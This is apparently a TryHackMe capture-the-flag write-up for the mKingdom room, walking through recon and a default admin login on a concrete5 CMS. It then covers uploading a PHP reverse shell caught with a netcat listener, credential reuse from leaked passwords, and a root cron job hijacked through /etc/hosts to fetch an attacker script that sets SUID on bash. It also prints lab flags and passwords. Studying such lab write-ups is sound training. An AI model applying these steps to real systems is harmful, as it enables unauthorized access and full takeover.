# Room: mKingdom

## General Info
- **Room link:** [mKingdom](https://tryhackme.com/room/mkingdom)

## Description

Try to root the machine!

## Provided Files / Links
- [x] Target Machine IP (10.10.221.143)

## Enumeration / Recon
- Ports Enumeration

`nmap -sV 10.10.221.143`

```
PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```
We have http on port 85.


- Directories Enumeration

`gobuster dir -u http://10.10.221.143:85 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100`

I found this directory:
`/app                  (Status: 301) [Size: 314] [--> http://10.10.221.143:85/app/]`


## Website

On the /app directory, there is a "JUMP" button.
When reading the script from the HTML: 

```

        function buttonClick() {
            alert("Make yourself confortable and enjoy my place.");
            window.location.href = 'castle';
        }
    
```

Clicking on the button redirects you to http://10.10.221.143:85/app/castle/.

The website is a CMS build with concrete5 (https://www.concretecms.com/).

From what I gathered from the internet, the earlier versions of concrete CMS were using admin as username and weak passwords.
I tried to login with admin and a few passwords and I actually got a hit with `password`. 



## Target machine exploitation

I went to a blank blog page and noticed that I could upload files. I created a php reverse shell and tried to upload it but the php extension is not supported.
I added php in the list of the supported extensions, uploaded the php file and I could access the file straight away.

I had previously started a listener on my machine `nc -lnvp 1337`, and I got a shell.

I am now `wwww-data` user.

### www-data user

When looking around, I didn't find anything interesting with this user.

I downloaded, ran linpeas.sh, and found this specific permission:

```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                    
-rwsr-xr-x 1 toad root 47K Mar 10  2016 /bin/cat 
```
The problem is that I cannot seem to locate the user.txt file.

In the linpeas results, I also found a database password:

```
'database' => 'mKingdom',
'password' => 'toadisthebest',
```
I tried to use this password to switch user (`su toad`) and it worked.

### toad user

I was stuck with the user toad for a while and I started reading all the hidden files in the /home/toad directory.

In the .bashrc file, I found a base64 encoded password `aWthVGVOVEFOdEVTCg==` => `ikaTeNTANtES`.

I tried using it on the user mario and it worked.

### mario user

I found the flag location but couldn't seem to open it with cat (normal), nano, vim...

head worked and I got the flag: **thm{030a769febb1b3291da1375234b84283}**.

I then had a really hard time finding root's password.

I went back to the linpeas results and had a look at the curl script that runs every minute:

`curl mkingdom.thm:85/app/castle/application/counter.sh`

What needs to be done now is changes the /etc/hosts and point the IP to my attacker machine. If I create the same app/castle/application structure and create a bash script to get root access, I'll be able to get the last flag.

For the bash script:
```
#!/bin/bash
chmod u+s /bin/bash
``` 

I just need to create a webserver on port 85 on my machine and wait a little bit (less than a minute) and the target machine is going to execute the counter.sh script on my machine.

### root user

The job ran and I was able to get root access. I found the root.txt flag in the root directory: **thm{e8b2f52d88b9930503cc16ef48775df0}**


